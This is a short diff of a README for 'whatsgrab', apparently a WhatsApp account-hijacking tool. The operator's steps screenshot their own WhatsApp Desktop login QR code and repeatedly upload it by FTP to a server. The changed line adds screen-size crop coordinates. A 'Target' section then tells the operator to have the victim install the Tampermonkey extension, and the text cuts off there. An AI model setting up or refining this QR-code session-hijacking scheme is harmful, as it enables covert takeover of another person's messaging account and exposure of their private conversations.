@@ -7,7 +7,7 @@ User:
 1. Pip install req.txt
 2. Open whatsgrab.py in Editor and edit the paths on lines 15 and 16 so they are correct for your machine
 3. Edit FTP access to your server
-4. Open WhatsAppDesktop on your pc and run the script, if WhatsApp is not automatically focussed open it manually. The script will now keep screenshoting you QRCode and upload it to the server
+4. Open WhatsAppDesktop fullscreen on your pc and run the script, if WhatsApp is not automatically focussed open it manually. The script will now keep screenshoting you QRCode and upload it to the server. If the qr code is not shown correctly on the server adjust on line 11 the values 1136,225,1400,488 to fit your screens size
 
 Target:
 1. Have the Target install https://www.tampermonkey.net/ extension
